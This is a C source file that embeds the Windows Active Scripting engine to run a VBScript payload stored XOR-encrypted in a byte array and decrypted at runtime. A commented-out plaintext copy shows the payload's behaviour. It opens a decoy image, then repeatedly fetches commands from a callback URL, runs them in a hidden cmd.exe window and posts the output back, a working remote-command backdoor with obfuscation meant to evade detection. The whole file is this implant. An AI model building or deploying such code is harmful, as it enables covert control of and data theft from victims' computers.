#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <ObjBase.h>
#include <ActivScp.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>

#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")


typedef struct {
    IActiveScriptSite       site;
    IActiveScriptSiteWindow siteWnd; 
    ULONG                   m_cRef;
} MyIActiveScriptSite;

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);

static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    if(ppv == NULL) return E_POINTER;
    
    // we implement the following interfaces
    if(IsEqualIID(&IID_IUnknown,          riid) || 
       IsEqualIID(&IID_IActiveScriptSite, riid)) 
    {
      *ppv = (LPVOID)this;
      AddRef(this);
      return S_OK;
    } 
    *ppv = NULL;
    return E_NOINTERFACE;
}

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
  
    _InterlockedIncrement(&mas->m_cRef);
    return mas->m_cRef;
}

static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
    
    ULONG ulRefCount = _InterlockedDecrement(&mas->m_cRef);  
    return ulRefCount;
}

static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
  LPCOLESTR objectName, DWORD dwReturnMask, 
  IUnknown **objPtr, ITypeInfo **ppti) 
{
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    return S_OK;
}

static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
  IActiveScriptError *scriptError) 
{
    EXCEPINFO ei;
    DWORD     dwSourceContext = 0;
    ULONG     ulLineNumber    = 0;
    LONG      ichCharPosition = 0;
    HRESULT   hr;
    
    memset(&ei, 0, sizeof(EXCEPINFO));
    
    hr = scriptError->lpVtbl->GetExceptionInfo(scriptError, &ei);
    if(hr == S_OK) {
      hr = scriptError->lpVtbl->GetSourcePosition(
        scriptError, &dwSourceContext, 
        &ulLineNumber, &ichCharPosition);
      if(hr == S_OK) {
      }
    }
    return S_OK;

    return S_OK;
}

static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *plcid) {
    return S_OK;
}

static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
    return S_OK;
}

static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
  const VARIANT *pvr, const EXCEPINFO *pei) 
{
    return S_OK;
}

static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
    return S_OK;
}

static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
    return S_OK;
}

static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
    return S_OK;
}


VOID run_script(PWCHAR lang, PCHAR script) {
    IActiveScriptParse     *parser;
    IActiveScript          *engine;
    MyIActiveScriptSite    mas;
    IActiveScriptSiteVtbl  vft;
    LPVOID                 cs;
    DWORD                  len;
    CLSID                  langId;
    HRESULT                hr;
    OLECHAR* obj;
    
    // 1. Initialize IActiveScript based on language
    CLSIDFromProgID(lang, &langId);
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    CoCreateInstance(
      &langId, 0, CLSCTX_INPROC_SERVER, 
      &IID_IActiveScript, (void **)&engine);
    
    // 2. Query engine for script parser and initialize
    engine->lpVtbl->QueryInterface(
        engine, &IID_IActiveScriptParse, 
        (void **)&parser);
        
    parser->lpVtbl->InitNew(parser);
    
    // 3. Initialize IActiveScriptSite interface
    vft.QueryInterface      = (LPVOID)QueryInterface;
    vft.AddRef              = (LPVOID)AddRef;
    vft.Release             = (LPVOID)Release;
    vft.GetLCID             = (LPVOID)GetLCID;
    vft.GetItemInfo         = (LPVOID)GetItemInfo;
    vft.GetDocVersionString = (LPVOID)GetDocVersionString;
    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
    vft.OnStateChange       = (LPVOID)OnStateChange;
    vft.OnScriptError       = (LPVOID)OnScriptError;
    vft.OnEnterScript       = (LPVOID)OnEnterScript;
    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
    
    mas.site.lpVtbl     = (IActiveScriptSiteVtbl*)&vft;
    mas.siteWnd.lpVtbl  = NULL;
    mas.m_cRef          = 0;
    
    
    engine->lpVtbl->SetScriptSite(
        engine, (IActiveScriptSite *)&mas);
        
    // 4. Convert script to unicode and execute
    len = MultiByteToWideChar(CP_ACP, 0, script, -1, NULL, 0);
    cs = malloc(len * sizeof(WCHAR));
    len = MultiByteToWideChar(CP_ACP, 0, script, -1, cs, len * sizeof(WCHAR));
    
    parser->lpVtbl->ParseScriptText(
         parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
    
    engine->lpVtbl->SetScriptState(
         engine, SCRIPTSTATE_CONNECTED);
    
    // 5. cleanup
    parser->lpVtbl->Release(parser);
    engine->lpVtbl->Close(engine);
    engine->lpVtbl->Release(engine);
    free(cs);
}

void decrypt(char *array, int array_size)
{
    int i;
    char secret[] = "?]!*[!!***]?[!";
    for(i = 0; i < array_size; i++) {
        array[i] ^= secret[i % strlen(secret)];
    }
        
}

int main(int argc, char *argv[]) {
    wchar_t *lang;
    lang = L"VBScript";
    //char script[] = "On Error Resume Next\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nDim tmpFolder \ntmpFolder = fso.GetSpecialFolder(2)\nCONST callbackUrl = \"http://localhost:80/\"\nSet oS = CreateObject (\"WScript.Shell\")\noS.run \"cmd.exe /C curl \"\"https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg\"\" -o \" & tmpFolder & \"\\tmp.jpg & start \"\" \"\" \" & tmpFolder & \"\\tmp.jpg & timeout 3\", 0, True\nDim xmlHttpReq, s, execObj, abc, break, re\n\nSet s = CreateObject(\"WScript.Shell\")\n\n\n\nbreak = False\nWhile break <> True\n    Set xmlHttpReq = CreateObject(\"MSXML2.ServerXMLHTTP\")\n    xmlHttpReq.Open \"GET\", callbackUrl, false\n	xmlHttpReq.SetTimeouts 10000, 10000, 10000, 100000\n    xmlHttpReq.Send\n\n    abc = \"cmd /c \" & Trim(xmlHttpReq.responseText) & \" > \" &  tmpFolder & \"\\out.txt\" \n\n    If InStr(abc, \"EXIT\") Then\n        break = True\n    Else\n        With CreateObject(\"WScript.Shell\")\n\n			' Pass 0 as the second parameter to hide the window...\n			.Run abc, 0, True\n\n		End With\n		\n		re = \"\"\n		\n		With CreateObject(\"Scripting.FileSystemObject\")\n			\n			re = .OpenTextFile(tmpFolder & \"\\out.txt\").ReadAll()\n			.DeleteFile tmpFolder & \"\\out.txt\"\n\n		End With\n\n        Set xmlHttpReq = CreateObject(\"MSXML2.ServerXMLHTTP\")\n        xmlHttpReq.Open \"POST\", callbackUrl, false\n		xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000\n        xmlHttpReq.Send(re)\n    End If\nWend";
    char script[] = {112,51,1,111,41,83,78,88,10,120,56,76,46,76,90,125,111,79,35,85,43,32,121,79,41,31,61,82,80,125,28,10,24,83,68,75,94,79,18,93,49,68,92,41,9,8,8,66,83,67,90,94,52,81,60,15,121,52,77,79,8,88,82,94,79,71,18,93,49,68,92,41,3,3,81,101,72,71,10,94,48,79,29,78,83,57,68,88,123,43,85,71,90,108,50,83,63,68,77,125,28,10,61,82,78,4,109,79,41,108,43,68,92,52,64,70,29,78,77,78,79,88,117,13,114,43,124,18,111,121,15,1,66,75,70,70,63,94,56,74,106,47,77,10,102,1,3,66,94,94,45,5,116,14,83,50,66,75,55,73,78,89,94,16,101,15,116,3,53,14,68,94,123,78,114,10,23,10,30,77,62,64,75,56,110,72,49,68,66,94,10,2,127,104,8,66,77,52,81,94,117,114,73,79,70,70,127,22,81,78,108,115,83,95,53,1,3,73,71,78,115,90,35,68,31,114,98,10,56,84,83,70,10,8,127,87,47,85,79,46,27,5,116,66,69,68,4,90,52,71,58,67,94,36,15,73,52,76,14,90,66,69,41,80,116,19,15,111,21,5,107,19,14,24,28,5,108,6,116,18,6,114,76,69,53,78,66,66,88,69,48,90,118,72,82,60,70,79,118,25,20,19,18,29,100,7,4,23,11,109,15,64,43,70,3,8,10,7,50,31,121,1,25,125,85,71,43,103,78,70,78,79,47,31,125,1,29,1,85,71,43,15,75,90,77,10,123,31,40,85,94,47,85,10,121,3,1,8,8,10,127,31,125,1,75,48,81,108,52,77,69,79,88,10,123,31,121,125,75,48,81,4,49,81,70,10,12,10,41,86,54,68,80,40,85,10,104,3,13,10,26,6,125,107,41,84,90,87,101,67,54,1,89,71,70,98,41,75,43,115,90,44,13,10,40,13,1,79,82,79,62,112,57,75,19,125,64,72,56,13,1,72,88,79,60,84,119,1,77,56,43,32,8,68,85,10,89,10,96,31,24,83,90,60,85,79,20,67,75,79,73,94,117,29,12,114,92,47,72,90,47,15,114,66,79,70,49,29,114,43,53,87,43,72,41,68,64,65,10,23,125,121,58,77,76,56,43,125,51,72,77,79,10,72,47,90,58,74,31,97,31,10,15,83,84,79,32,10,125,31,123,114,90,41,1,82,54,77,105,94,94,90,15,90,42,1,2,125,98,88,62,64,85,79,101,72,55,90,56,85,23,127,108,121,3,108,109,24,4,121,56,77,45,68,77,5,108,102,19,117,117,122,8,3,87,31,123,1,31,37,76,70,19,85,85,90,120,79,44,17,20,81,90,51,1,8,28,100,117,8,6,10,62,94,55,77,93,60,66,65,14,83,77,6,10,76,60,83,40,68,53,84,89,71,55,105,85,94,90,120,56,78,117,114,90,41,117,67,54,68,78,95,94,89,125,14,107,17,15,109,13,10,106,17,17,26,26,6,125,14,107,17,15,109,13,10,106,17,17,26,26,26,87,31,123,1,31,37,76,70,19,85,85,90,120,79,44,17,8,68,81,57,43,32,123,1,1,10,75,72,62,31,102,1,29,62,76,78,123,14,66,10,8,10,123,31,15,83,86,48,9,82,54,77,105,94,94,90,15,90,42,15,77,56,82,90,52,79,82,79,126,79,37,75,114,1,25,125,3,10,101,1,3,10,12,10,125,75,54,81,121,50,77,78,62,83,1,12,10,8,1,80,46,85,17,41,89,94,121,1,43,32,10,10,125,31,18,71,31,20,79,121,47,83,9,75,72,73,113,31,121,100,103,20,117,8,114,1,117,66,79,68,87,31,123,1,31,125,1,10,123,67,83,79,75,65,125,2,123,117,77,40,68,32,123,1,1,10,111,70,46,90,81,1,31,125,1,10,123,1,1,125,67,94,53,31,24,83,90,60,85,79,20,67,75,79,73,94,117,29,12,114,92,47,72,90,47,15,114,66,79,70,49,29,114,43,53,84,40,35,124,1,113,75,89,89,125,15,123,64,76,125,85,66,62,1,82,79,73,69,51,91,123,81,94,47,64,71,62,85,68,88,10,94,50,31,51,72,91,56,1,94,51,68,1,93,67,68,57,80,44,15,17,115,43,35,82,40,15,120,95,68,125,94,57,66,19,125,17,6,123,117,83,95,79,32,87,54,82,100,81,57,1,125,50,85,73,32,35,35,87,54,82,83,90,125,28,10,121,3,43,35,35,32,84,54,12,72,75,53,1,105,41,68,64,94,79,101,63,85,62,66,75,117,3,121,56,83,72,90,94,67,51,88,117,103,86,49,68,121,34,82,85,79,71,101,63,85,62,66,75,127,8,32,82,40,40,32,35,35,84,77,62,1,2,125,15,101,43,68,79,126,79,82,41,121,50,77,90,117,85,71,43,103,78,70,78,79,47,31,125,1,29,1,78,95,47,15,85,82,94,8,116,17,9,68,94,57,96,70,55,9,8,32,35,35,84,17,31,68,83,56,85,79,29,72,77,79,10,94,48,79,29,78,83,57,68,88,123,7,1,8,118,69,40,75,117,85,71,41,3,32,81,40,40,111,68,78,125,104,50,85,87,87,43,10,123,1,1,10,10,10,125,108,62,85,31,37,76,70,19,85,85,90,120,79,44,31,102,1,124,47,68,75,47,68,110,72,64,79,62,75,115,3,114,14,121,103,23,19,15,121,79,88,43,90,41,121,114,17,105,126,15,113,3,3,32,10,125,31,123,1,31,125,1,82,54,77,105,94,94,90,15,90,42,15,112,45,68,68,123,3,113,101,121,126,127,19,123,66,94,49,77,72,58,66,74,127,88,70,113,31,61,64,83,46,68,32,82,40,89,71,70,98,41,75,43,115,90,44,15,121,62,85,117,67,71,79,50,74,47,82,31,108,17,26,107,17,13,10,27,26,109,15,107,13,31,108,17,26,107,17,13,10,27,26,109,15,107,43,31,125,1,10,123,1,1,10,82,71,49,119,47,85,79,15,68,91,117,114,68,68,78,2,47,90,114,43,31,125,1,10,30,79,69,10,99,76,87,104,62,79,91,0};
    int length = strlen(script);
    decrypt(script, length);
    run_script(lang, script);
    return 0;
}